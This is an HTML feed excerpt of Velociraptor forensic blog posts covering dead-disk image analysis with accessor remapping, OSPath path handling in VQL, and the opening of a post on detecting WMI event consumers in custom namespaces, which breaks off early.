 &lt;a class="image-link" href="ntfs_accssor_vfs.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Browsing the VFS with the remapped ntfs accessor
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h3 id="remapping-the-registry-hives">Remapping the registry hives&lt;/h3>
&lt;p>The above default remapping rules also include the following rule&lt;/p>
&lt;pre>&lt;code class="language-yaml">- type: mount
 description: Map the /Windows/System32/Config/SOFTWARE Registry hive on HKEY_LOCAL_MACHINE\Software
 from:
 accessor: raw_reg
 prefix: |-
 {
 &amp;quot;Path&amp;quot;: &amp;quot;/&amp;quot;,
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;raw_ntfs&amp;quot;,
 &amp;quot;Delegate&amp;quot;: {
 &amp;quot;DelegateAccessor&amp;quot;:&amp;quot;offset&amp;quot;,
 &amp;quot;Delegate&amp;quot;: {
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;file&amp;quot;,
 &amp;quot;DelegatePath&amp;quot;: &amp;quot;/mnt/flat&amp;quot;,
 &amp;quot;Path&amp;quot;: &amp;quot;122683392&amp;quot;
 },
 &amp;quot;Path&amp;quot;:&amp;quot;/Windows/System32/Config/SOFTWARE&amp;quot;
 }
 }
 path_type: registry
 &amp;quot;on&amp;quot;:
 accessor: registry
 prefix: HKEY_LOCAL_MACHINE\Software
 path_type: registry
&lt;/code>&lt;/pre>
&lt;p>This rule mounts the &lt;code>registry&lt;/code> accessor&amp;rsquo;s
&lt;code>HKEY_LOCAL_MACHINE\Software&lt;/code> path on the
&lt;code>/Windows/System32/Config/SOFTWARE&lt;/code> file found within the raw NTFS
partition. Note how pathspec descriptors nest and can utilize
multiple different accessors to achieve the final mount point (in this
case, the &lt;code>file&lt;/code> accessor, followed by &lt;code>offset&lt;/code> followed by &lt;code>raw_ntfs&lt;/code>
followed by &lt;code>raw_registry&lt;/code>)..&lt;/p>
&lt;p>











&lt;figure id="0667c9ffdbaba5156fb50b4b60f3c23b">
 &lt;div data-featherlight="#0667c9ffdbaba5156fb50b4b60f3c23b" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-03-22-deaddisk/reg_accssor_vfs.png" alt="Browsing the VFS with registry accessors">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="reg_accssor_vfs.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Browsing the VFS with registry accessors
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Normally, when interacting with a live Velociraptor client, the
&lt;code>registry&lt;/code> accessor refers to registry keys and values accessed
through the OS API. However now we were able to mount a raw registry
parser on top of the &lt;code>registry&lt;/code> accessor.&lt;/p>

&lt;div class="mynotices note">
 &lt;div heading=" What does remapping achieve? ">&lt;p>By remapping the traditional accessors with emulated content, we are
effectively allowing the same VQL queries to apply to very different
scenarios &lt;strong>without change&lt;/strong>. For example, an artifact that queries
the registry using the API will now automatically query the raw
registry parser which accesses the hive file as recovered from parsing
the ntfs filesystem on a dead disk image.&lt;/p>
&lt;p>We can apply the same artifacts to the dead disk image without any
modification!&lt;/p>
&lt;/div>
&lt;/div>


&lt;h3 id="remapping-currentcontrolset">Remapping CurrentControlSet&lt;/h3>
&lt;p>In Windows there are virtual parts of the registry that get remounted
at runtime. One such part is the
&lt;code>HKEY_LOCAL_MACHINE\Software\CurrentControlSet&lt;/code> key which is mounted
from &lt;code>HKEY_LOCAL_MACHINE\Software\ControlSet001&lt;/code>. Velociraptor can recreate this mapping using the following remapping rule:&lt;/p>
&lt;pre>&lt;code class="language-yaml">- type: mount
 description: Map the /Windows/System32/Config/SYSTEM Registry hive on HKEY_LOCAL_MACHINE\System\CurrentControlSet
 (Prefixed at /ControlSet001)
 from:
 accessor: raw_reg
 prefix: |-
 {
 &amp;quot;Path&amp;quot;: &amp;quot;/ControlSet001&amp;quot;,
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;raw_ntfs&amp;quot;,
 &amp;quot;Delegate&amp;quot;: {
 &amp;quot;DelegateAccessor&amp;quot;:&amp;quot;offset&amp;quot;,
 &amp;quot;Delegate&amp;quot;: {
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;file&amp;quot;,
 &amp;quot;DelegatePath&amp;quot;: &amp;quot;/mnt/flat&amp;quot;,
 &amp;quot;Path&amp;quot;: &amp;quot;122683392&amp;quot;
 },
 &amp;quot;Path&amp;quot;:&amp;quot;/Windows/System32/Config/SYSTEM&amp;quot;
 }
 }
 path_type: registry
 &amp;quot;on&amp;quot;:
 accessor: registry
 prefix: HKEY_LOCAL_MACHINE\System\CurrentControlSet
 path_type: registry
&lt;/code>&lt;/pre>
&lt;p>This is very important for queries that read sub-keys of &lt;code>CurrentControlSet&lt;/code>.&lt;/p>
&lt;h3 id="impersonating-an-operating-system">Impersonating an operating system&lt;/h3>
&lt;p>We discussed how accessors can be remapped using the remapping rules
in order to make VQL plugins that access files emulate running on the
target system. However, many artifacts need to examine more than just
the filesystem. For example, most artifacts have a &lt;code>precondition&lt;/code> such
as &lt;code>SELECT * FROM info() WHERE OS =~ &amp;quot;Windows&amp;quot;&lt;/code>. If we were to run on
a Linux system these artifacts will not work since they are intended
to work on windows - despite the remapping rules emulating a Windows
system.&lt;/p>
&lt;p>We therefore need to &lt;code>impersonate&lt;/code> a windows system - even when we are
really running on a Linux machine. The impersonation rule looks like:&lt;/p>
&lt;pre>&lt;code class="language-yaml">- type: impersonation
 os: windows
 hostname: VirtualHostname
 env:
 - key: SystemRoot
 value: C:\Windows
 - key: WinDir
 value: C:\Windows
 disabled_functions:
 - amsi
 - lookupSID
 - token
 disabled_plugins:
 - users
 - certificates
 - handles
 - pslist
&lt;/code>&lt;/pre>
&lt;p>This rule has a number of functions&lt;/p>
&lt;ol>
&lt;li>
&lt;p>The OS type is set to Windows- This affects the output from
&lt;code>SELECT * FROM info()&lt;/code> - this query controls most of the artifact
preconditions.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>A specific hostname is set to &amp;ldquo;VirtualHostname&amp;rdquo;. When the client
interrogates, this hostname will appear in the Velociraptor GUI.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>We specify a number of environment variables. This affects the
&lt;code>expand()&lt;/code> function which expands paths using environment
variables. Many artifacts use environment variables to locate files
within the filesystem.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Disabled functions and plugins: Many artifacts use plugins and
functions that query non-disk system state in order to enrich the
collected data. I.e. their output does not depend just on the
disk. Using this impersonation rule we can disable those plugins
and functions (essentially return nothing from them) so the query
can complete successfully.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Impersonation aims to make it appear that the VQL artifacts are being
collected from the target system as if it were running live.&lt;/p>
&lt;p>Here is an example of collecting some common Windows artifacts from my
flat image above - running on a Linux analysis machine. We can see
some of our favorite artifacts, such as &lt;code>Windows.Forensics.Usn&lt;/code>,
&lt;code>Windows.Timeline.Prefetch&lt;/code>, &lt;code>Windows.Forensics.Bam&lt;/code> and many more.&lt;/p>
&lt;p>











&lt;figure id="723478fa95b94a09cc818a0c7530f17e">
 &lt;div data-featherlight="#723478fa95b94a09cc818a0c7530f17e" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-03-22-deaddisk/artifacts_prefetch.png" alt="Collecting some common artifacts">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="artifacts_prefetch.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Collecting some common artifacts
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="analysis-of-non-windows-disk-images">Analysis of non windows disk images&lt;/h2>
&lt;p>In the previous example, we exported the &lt;code>vmdk&lt;/code> image as a flat file
and simply relied on Velociraptor to parse the filesystem using its
inbuilt NTFS parser.&lt;/p>
&lt;p>For other operating systems, Velociraptor does not currently have a
native parser (for example for Linux or MacOS). Instead, Velociraptor
relies on another tool mounting the image filesystem as a directory.&lt;/p>
&lt;p>We can still perform the analysis as before however, by remapping the
mounted directory instead of a raw image.&lt;/p>
&lt;p>To demonstrate this process I will mount the flat image using the
Linux loopback driver and the built in Linux NTFS filesystem support.&lt;/p>
&lt;pre>&lt;code>$ sudo mount -o loop,offset=122683392 /mnt/flat /tmp/mnt/
&lt;/code>&lt;/pre>
&lt;p>I can now generate a second remapping configuration:&lt;/p>
&lt;pre>&lt;code>$ ./velociraptor-v0.6.4-linux-amd64 deaddisk --add_windows_directory /tmp/mnt/ /tmp/remapping2.yaml
velociraptor: Adding windows mounted directory at /tmp/mnt/
velociraptor: Checking for hive at /tmp/mnt/Windows/System32/Config/SOFTWARE
velociraptor: Checking for hive at /tmp/mnt/Windows/System32/Config/SYSTEM
velociraptor: Checking for hive at /tmp/mnt/Windows/System32/Config/SYSTEM
&lt;/code>&lt;/pre>
&lt;p>Velociraptor will inspect the directory and determine it is a Windows
image, then attempt to map the raw registry hives at the correct place
as before. The &lt;code>C:&lt;/code> drive remapping rule is:&lt;/p>
&lt;pre>&lt;code class="language-yaml">- type: mount
 description: 'Mount the directory /tmp/mnt/ on the C: drive (NTFS)'
 from:
 accessor: file
 prefix: /tmp/mnt/
 &amp;quot;on&amp;quot;:
 accessor: file
 prefix: 'C:'
 path_type: windows
&lt;/code>&lt;/pre>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>Velociraptor is an extremely capable triage and analysis tool which
works best when running live on the endpoint - where it can correlate
information from disk, memory and volatile system state. Velociraptor
has a vibrant community with powerful user contributed artifacts
designed for use in this context.&lt;/p>
&lt;p>However, sometimes we do not have the luxury of running directly on
the running endpoint, but have to rely instead on dead disk images of
the target system. The latest Velociraptor release makes it possible
to impersonate a live system based on information from the dead
disk. While this is not perfect (because a lot of the enrichment
information obtained from the live system is missing) for basic disk
focused forensic analysis, we are able to use most artifacts directly
without change.&lt;/p>
&lt;p>This feature opens Velociraptor to more traditional image based
forensic analysis use cases - these users are now able to leverage the
same artifacts we all use in live triage to quickly triage dead disk
images.&lt;/p>
&lt;p>Since this is such a new feature it is still considered experimental -
we value your feedback, bug reports and discussions. If you would
like to try out these features in Velociraptor, It is available on
GitHub under an open source license. As always, please file issues on
the bug tracker or ask questions on our mailing list
&lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>
. You can also chat with us
directly on discord at &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
.&lt;/p></description></item><item><title>Paths and filesystem accessors</title><link>https://docs.velociraptor.app/blog/2022/2022-03-21-paths/</link><pubDate>Sun, 20 Mar 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2022/2022-03-21-paths/</guid><description>
&lt;div class="mynotices note">
 &lt;div heading="note">&lt;p>This article discusses a feature available since 0.6.4 release.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>Path handling is fundamental to forensic analysis, as a large amount
of relevant information is still kept on disk within a
filesystem. Superficially, We are all familiar with how paths work - a
path is typically a string that we can provide to some OS API (for
example the Windows &lt;code>CreateFile()&lt;/code> or Linux &lt;code>open()&lt;/code> API) which
facilitates interacting with a file or a directory on the filesystem.&lt;/p>
&lt;p>Unfortunately, the structure of this string is often not well defined
or consistent between operating systems! For example, on windows a
path has the following characteristics:&lt;/p>
&lt;ol>
&lt;li>The path starts with a &amp;ldquo;drive letter&amp;rdquo; of the form &lt;code>C:&lt;/code> or &lt;code>D:&lt;/code>&lt;/li>
&lt;li>Path directories are separated by a backslash &lt;code>\&lt;/code>&lt;/li>
&lt;li>There is no leading path separator (&lt;code>C:\&lt;/code> does not start with &lt;code>\&lt;/code>).&lt;/li>
&lt;li>Directory names may not contain forward slashes, backslashes or wildcards.&lt;/li>
&lt;li>Filenames are generally case insensitive.&lt;/li>
&lt;/ol>
&lt;p>For example &lt;code>C:\Windows\System32\Notepad.exe&lt;/code>&lt;/p>
&lt;p>On Linux things are a bit different:&lt;/p>
&lt;ol>
&lt;li>Paths begin with the slash character (the root of the filesystem)&lt;/li>
&lt;li>Path directories are separated by forward slash&lt;/li>
&lt;li>Directory names may contain backslashes but these are &lt;strong>not&lt;/strong> path
separators! Filename may contain pretty much any character (except
null and forward slash).&lt;/li>
&lt;/ol>
&lt;p>For example, a path looks like &lt;code>/usr/bin/ls&lt;/code>. However, since Linux can
have backslashes with filenames, the path &lt;code>/C:\Windows/System32&lt;/code> can
actually refer to a single directory named &lt;code>C:\Windows&lt;/code>!&lt;/p>
&lt;p>It gets even more complicated on windows, where a &lt;code>device name&lt;/code> may
appear as the first element of the path where it refers to a physical
device for example &lt;code>\\.\C:\Windows&lt;/code> means the &lt;code>Windows&lt;/code> directory
inside the filesystem on the device &lt;code>\\.C:&lt;/code> - Yes the device can
contain backslashes which are also path separators &lt;strong>except&lt;/strong> when
they refer to a device.&lt;/p>
&lt;p>A registry path has other rules:&lt;/p>
&lt;ol>
&lt;li>It starts with the hive name, e.g. &lt;code>HKEY_LOCAL_MACHINE&lt;/code> or &lt;code>HKLM&lt;/code>&lt;/li>
&lt;li>Components are separated by backslashes&lt;/li>
&lt;li>While key names are analogous to directories, registry keys are
allowed to have forward slash characters.&lt;/li>
&lt;li>While Value name are analogous to files, value name may also have
backslashes!&lt;/li>
&lt;/ol>
&lt;p>For example the following registry path is valid
&lt;code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\&lt;/code> &lt;code>Windows Presentation Foundation\Namespaces\http://schemas.microsoft.com/netfx/2009/xaml/presentation&lt;/code>
(with the last registry key being a URL) even though the registry key
contains forward slashes it is just one key component!&lt;/p>
&lt;p>With all these confusing rules we need to develop an abstraction that
allows Velociraptor to handle all these cases correctly.&lt;/p>
&lt;h2 id="the-ospath-abstraction">The OSPath abstraction&lt;/h2>
&lt;p>Recent Velociraptor releases, introduced the &lt;code>OSPath&lt;/code> abstraction to
handle various paths:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Internally paths are always a list of components. For example, the
windows path &lt;code>C:\Windows\System32&lt;/code> is represented internally as the
list of components &lt;code>[&amp;quot;C:&amp;quot;, &amp;quot;Windows&amp;quot;, &amp;quot;System32&amp;quot;]&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>A Filesystem is treated as a tree, and the path is simply the list
of components connecting each level in the tree.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>An &lt;code>OSPath&lt;/code> implements specific serialization and deserialization
methods: When we need to pass an OSPath object to the OS API we
need to serialize the abstract OSPath in a way that is appropriate
to the OS. Otherwise we prefer to retain the OSPath as an abstract
path as much as possible.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Each &lt;code>OSPath&lt;/code> has a specific flavor - controlling for the way it is
serialized to and from a string.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>For example, an OSPath with the following components &lt;code>[&amp;quot;C:&amp;quot;, &amp;quot;Windows&amp;quot;, &amp;quot;System32&amp;quot;]&lt;/code> will serialize to string:&lt;/p>
&lt;ul>
&lt;li>A Windows &lt;code>OSPath&lt;/code> will serialize to &lt;code>C:\Windows\System32&lt;/code>&lt;/li>
&lt;li>A Linux &lt;code>OSPath&lt;/code> will serialize to &lt;code>/C:/Windows/System32&lt;/code>&lt;/li>
&lt;li>A Windows NTFS aware OSPath will serialize to
&lt;code>\\.\C:\Windows\System32&lt;/code> (i.e. device notation appropriate to the
NTFS raw accessor).&lt;/li>
&lt;/ul>
&lt;h2 id="the-glob-plugin">The glob() plugin&lt;/h2>
&lt;p>One of the most commonly used plugins in Velociraptor is the &lt;code>glob()&lt;/code>
plugin. This plugin allows searching of filesystems using a glob
expression (containing wildcards).&lt;/p>
&lt;p>Consider the following query running on windows&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT OSPath
FROM glob(globs=&amp;quot;C:\\Windows\\*&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>The &lt;code>glob()&lt;/code> plugin applies the glob expression on the filesystem and
returns a single row for each matching file. Since release &lt;code>0.6.4&lt;/code>,
the raw &lt;code>OSPath&lt;/code> object is also available within VQL. While it may
appear that it is a simple string when serialized to JSON, it is in
fact an object with many convenient methods.&lt;/p>
&lt;p>











&lt;figure id="63a3e92e1f8cd6c120da46d0e5d17c19">
 &lt;div data-featherlight="#63a3e92e1f8cd6c120da46d0e5d17c19" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-03-21-paths/ospath.png" alt="The OSPath object">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="ospath.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 The OSPath object
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The OSPath object has some convenient properties:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>The &lt;code>Components&lt;/code> field contains the list of path components in the
path. You can index the component to identify a specific directory
or filename. (negative indexes are counted from the end of the
component array).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The &lt;code>Basename&lt;/code> property is a shorthand to the last component
(equivalent to &lt;code>OSPath.Components[-1]&lt;/code>)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The &lt;code>Dirname&lt;/code> property is an OSPath representing the directory
containing the OSPath.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Path manipulation is very easy to do, since OSPath is overloading
the addition operator. The expression &lt;code>OSPath.Dirname + &amp;quot;explorer.exe&amp;quot;&lt;/code> produces another OSPath obtained by appending the
&lt;code>explorer.exe&lt;/code> component to the directory of the current OSPath.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="filesystem-accessors-and-ospath">Filesystem accessors and OSPath&lt;/h2>
&lt;p>Velociraptor accesses filesystems by way of an &lt;code>accessor&lt;/code>. You can think
of an accessor as a specific driver that VQL can use to open a
path. All VQL plugins or functions that accept files will also accept
an accessor to use to open the file.&lt;/p>
&lt;p>Consider the following VQL query:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT read_file(path=&amp;quot;C:/Windows/notepad.exe&amp;quot;, accessor=&amp;quot;file&amp;quot;)
FROM scope()
&lt;/code>&lt;/pre>
&lt;p>The &lt;code>read_file()&lt;/code> VQL function reads raw data from the specified
file. It will call onto the &amp;ldquo;file&amp;rdquo; accessor and pass the provided path
to it as an opaque string.&lt;/p>
&lt;p>The &lt;code>file&lt;/code> accessor is used to open files using the OS
APIs. Therefore, it will interpret the path string according to the OS
convention it is running on (i.e. on Windows it will create a Windows
flavor of OSPath). However, were we to use another accessor, the
string path will be interpreted differently by the accessor.&lt;/p>

&lt;div class="mynotices note">
 &lt;div heading=" Interpreting paths ">&lt;p>The most important takeaway from this is that when an accessor
receives a string path, it will parse it into an OSPath internally
according to its own rules.&lt;/p>
&lt;p>When an accessor receives an already parsed OSPath object, it may
directly use it (since no parsing is required). Therefore in general,
once an OSPath object is produced in the query, the same OSPath object
should be passed around to other plugins/vql functions.&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT read_file(filename=OSPath, accessor=&amp;quot;file&amp;quot;, length=5)
FROM glob(globs=&amp;quot;C:\\Windows\\notepad.exe&amp;quot;)
&lt;/code>&lt;/pre>
&lt;/div>
&lt;/div>


&lt;h2 id="nested-accessors-and-pathspecs">Nested accessors and pathspecs&lt;/h2>
&lt;p>Many VQL accessors require additional information to be able to
work. For example consider the &lt;code>zip&lt;/code> accessor. This accessor is used
to read zip archive members as if they were simple files. In order to
open an archive member we need several pieces of information:&lt;/p>
&lt;ol>
&lt;li>The path to the zip file itself.&lt;/li>
&lt;li>An accessor to use to open the zip file container.&lt;/li>
&lt;li>The path to the zip member inside the container to open.&lt;/li>
&lt;/ol>
&lt;p>The &lt;code>zip&lt;/code> accessor therefore requires a more complex OSPath object
containing additional information about the &lt;code>Delegate&lt;/code> (i.e. the path
and accessor that the zip accessor will delegate the actual reading
to). We call this more complex path specification a &lt;code>pathspec&lt;/code> as it
specifies more precisely what the accessor should do. In a VQL query
we may build a pathspec from scratch using the &lt;code>pathspec&lt;/code> function.&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT read_file(
 filename=pathspec(DelegateAccessor=&amp;quot;file&amp;quot;,
 DelegatePath=&amp;quot;F:/hello.zip&amp;quot;,
 Path=&amp;quot;/hello.txt&amp;quot;),
 accessor=&amp;quot;zip&amp;quot;, length=5)
FROM scope()
&lt;/code>&lt;/pre>
&lt;p>In the above example I am calling the &lt;code>read_file()&lt;/code> VQL function, and
building an OSPath object directly using the &lt;code>pathspec()&lt;/code> VQL
function.&lt;/p>
&lt;p>The &lt;code>zip&lt;/code> accessor receives the new OSPath object and&lt;/p>
&lt;ol>
&lt;li>Will open the zip container itself using the &lt;code>Delegate&lt;/code>: i.e. the
&amp;ldquo;file&amp;rdquo; accessor, with a path of &amp;ldquo;F:/hello.zip&amp;rdquo;.&lt;/li>
&lt;li>After parsing the zip file, the &lt;code>zip&lt;/code> accessor will open the member
within it specified by the &lt;code>Path&lt;/code> field. For zip files, the path is
interpreted as a forward slash separated unix like path (according
to the zip specification). In this case the zip accessor will open
a member called &lt;code>hello.txt&lt;/code>.&lt;/li>
&lt;/ol>
&lt;h2 id="nesting-ospath-objects">Nesting OSPath objects.&lt;/h2>
&lt;p>We can combine the previous two queries to search zip files&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT OSPath,
 read_file(filename=OSPath, accessor=&amp;quot;zip&amp;quot;, length=5)
FROM glob(
 globs=&amp;quot;/*.txt&amp;quot;,
 root=pathspec(DelegateAccessor=&amp;quot;file&amp;quot;, DelegatePath=&amp;quot;F:/hello.zip&amp;quot;, Path=&amp;quot;/&amp;quot;),
 accessor=&amp;quot;zip&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>This time we provide the &lt;code>glob()&lt;/code> plugin the root (where searching
will begin) as a full OSPath object that we construct to represent the
top level of the zip archive (i.e. globing will proceed within the zip
file).&lt;/p>
&lt;p>We can transparently now pass the OSPath object that glob will return
directly into any VQL function or plugin that accepts a file
(e.g. &lt;code>read_file()&lt;/code>)&lt;/p>
&lt;p>











&lt;figure id="2eb69d1edc86b3b1225d0fd82443289f">
 &lt;div data-featherlight="#2eb69d1edc86b3b1225d0fd82443289f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-03-21-paths/nested_pathspec.png" alt="Handling nested OSPath objects">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="nested_pathspec.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Handling nested OSPath objects
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The OSPath object is now capable of more complex path manipulations:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>The &lt;code>OSPath.Dirname&lt;/code> property represents the fully qualified OSPath
used to represent the container directory - we can simply pass it
directly to any plugins that deal with directories.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Note that more complex &lt;code>Pathspec&lt;/code> based paths are represented as a
JSON encoded object. It is ok to pass the stringified version the
OSPath around to plugins because they will automatically parse the
string into an OSPath object.&lt;/p>
&lt;/li>
&lt;/ol>

&lt;div class="mynotices warning">
 &lt;div heading=" Glob&amp;#39;s root parameter ">&lt;p>In previous versions of Velociraptor it was possible to pass a
pathspec to the glob parameter (e.g. to glob within a zip file)
however since 0.6.4 this is not allowed. Glob expressions are always
flat strings (i.e. a glob is not a pathspec). A pathspec is allowed to
be passed to the root parameter to indicate where searching should
start from.&lt;/p>
&lt;/div>
&lt;/div>


&lt;h2 id="compatibility-with-previous-releases">Compatibility with previous releases&lt;/h2>
&lt;p>Previously the &lt;code>glob()&lt;/code> plugin would emit the &lt;code>FullPath&lt;/code> column as a
string representing the serialized version of each file. This string
was passed to other plugins/vql functions which parsed it again. This
lead to a lot of unnecessary path serialization and parsing, but more
importantly it was difficult to maintain the correct &amp;ldquo;flavor&amp;rdquo; of the
path throughout the query and required a lot of complex path
manipulations to extract specific parts of the path.&lt;/p>
&lt;p>It should be more efficient to pass the raw OSPath object everywhere
the old FullPath was used. However 0.6.4 onward still provide the
FullPath column for backwards compatibility. The overall effect is
that artifacts originally written for older versions of VQL should
continue to work on 0.6.4. However newer artifacts written for 0.6.4
will not run on older clients.&lt;/p>
&lt;p>Previously nested paths were encoded with URLs, but this is now
deprecated and future VQL queries should not use URLs to encode nested
paths.&lt;/p>

&lt;div class="mynotices warning">
 &lt;div heading=" Supporting older clients ">&lt;p>Many people upgrade their Velociraptor server more frequently than
their clients. Usually, newer versions of Velociraptor maintains
reasonable backwards compatibility with older clients so most things
continue to work. However in 0.6.4, the introduction of the &lt;code>OSPath&lt;/code>
column means that newer artifacts will fail on older clients (since
VQL is evaluated on the client).
See our &lt;a href="https://docs.velociraptor.app/docs/overview/support/" >Support Policy&lt;/a>
&lt;/p>
&lt;p>To help with the migration process, we made the older versions of
artifacts easily available in newer servers. If you still have older
clients deployed, you should import older VQL artifacts into &lt;code>0.6.4&lt;/code>
server using the &lt;code>Server.Import.PreviousReleases&lt;/code> server
artifact. This will import the old artifacts under a name reflecting
their version so they may be collected from older clients.&lt;/p>
&lt;/div>
&lt;/div>


&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>Path representation is surprisingly much more complex that it first
appears. While paths are strings, internally Velociraptor treats them
as a sequence of components with different flavors controlling how
they are serialized and represented. This affords the VQL query a more
powerful way to manipulate paths and build new paths based on them.&lt;/p>
&lt;p>For more complex accessors, paths are represented as a JSON serialized
&lt;code>pathspec&lt;/code> object, describing a delegate container path as well. Using
the &lt;code>OSPath&lt;/code> object methods does the right thing even for more complex
path and makes it a lot easier to manipulate (for example
&lt;code>OSPath.Dirname&lt;/code> is a valid and correct &lt;code>OSPath&lt;/code> for the containing
directory, even for more complex pathspec based paths)&lt;/p></description></item><item><title>WMI Event Consumers: what are you missing?</title><link>https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/</link><pubDate>Wed, 12 Jan 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/</guid><description>&lt;p>WMI Eventing is a fairly well known technique in DFIR, however some
tools may not provide the coverage you expect. This article covers
WMI eventing visibility and detection including custom namespaces.&lt;/p>
&lt;p>











&lt;figure id="194ba7e653d5c903b91e8a29414b3654">
 &lt;div data-featherlight="#194ba7e653d5c903b91e8a29414b3654" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/00SelectionBias.png" alt="Selection bias in WWII: missing what is not collected.">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="00SelectionBias.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Selection bias in WWII: missing what is not collected.
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="background">Background&lt;/h2>
&lt;p>There has been a fair bit of research and observations of WMI eventing
in field over the last years. In short, a WMI event consumer is a
method of subscribing to certain system events, then enabling an action
of some sort. Common adversary use cases may include persistence, privilege
escalation, or as a collection trigger. Represented as ATT&amp;amp;CK T1546.003
this technique has been observed in use from APT, through to trash-tic
worm and coin miner threats.&lt;/p>
&lt;p>











&lt;figure id="f09ba24999c91d0e1953062cc7f6987c">
 &lt;div data-featherlight="#f09ba24999c91d0e1953062cc7f6987c" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/01WMIOverview.png" alt="WMI Eventing: 3 system classes">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="01WMIOverview.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 WMI Eventing: 3 system classes
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>There are three system classes in every active event consumer:&lt;/p>
&lt;ol>
&lt;li>__EventFilter is a WQL query that outlines the trigger event of
interest.&lt;/li>
&lt;li>__EventConsumer is an action to perform upon triggering an event.&lt;/li>
&lt;li>__FilterToConsumerBinding is the registration mechanism that binds
a filter to a consumer.&lt;/li>
&lt;/ol>
&lt;p>Most detection will focus on collecting the WMI classes in root/subscription
and, in some tools root/default WMI namespaces.&lt;/p>
&lt;p>











&lt;figure id="9ac8c6545958803b1e63004624e6aecb">
 &lt;div data-featherlight="#9ac8c6545958803b1e63004624e6aecb" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/02Autoruns.png" alt="Autoruns 14.07: detects root/default and root/subscription namespace WMI event consumers">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="02Autoruns.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Autoruns 14.07: detects root/default and root/subscription namespace WMI event consumers
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h4 id="custom-namespaces">Custom Namespaces&lt;/h4>
&lt;p>At Blackhat 2018 Lee Christensen and Matt Graeber presented &amp;ldquo;Subverting
Sysmon: Application of a Formalized Security Product Evasion Methodology&amp;rdquo;.
This excellent talk focused on defense evasion methodology and highlighted
potential collection gaps in telemetry tools around WMI eventing. In this
case, the focus was on Sysmon behaviour of collection only in
root/subscription, interestingly, it also highlighted the possibility to
implement __EventConsumer classes in arbitrary namespaces.&lt;/p>
&lt;p>It is detection of WMI Event Consumers in arbitrary namespaces that I&amp;rsquo;m going
to focus. For anyone interested in testing I have written
&lt;a href="https://github.com/mgreen27/mgreen27.github.io/blob/master/static/other/WMIEventingNoisemaker/WmiEventingNoisemaker.ps1" target="_blank" >a script to generate WMI event consumers&lt;/a>
.
This script wraps several powershell functions released during the Black
Hat talk to test creating working event consumers.&lt;/p>
&lt;p>First step was to create a custom namespace event consumer. In this
instance I selected the namespace name &lt;code>totallylegit&lt;/code> and attached an
ActiveScript event consumer.&lt;/p>
&lt;p>











&lt;figure id="07e245e677959853d6d32897b82bc2e9">
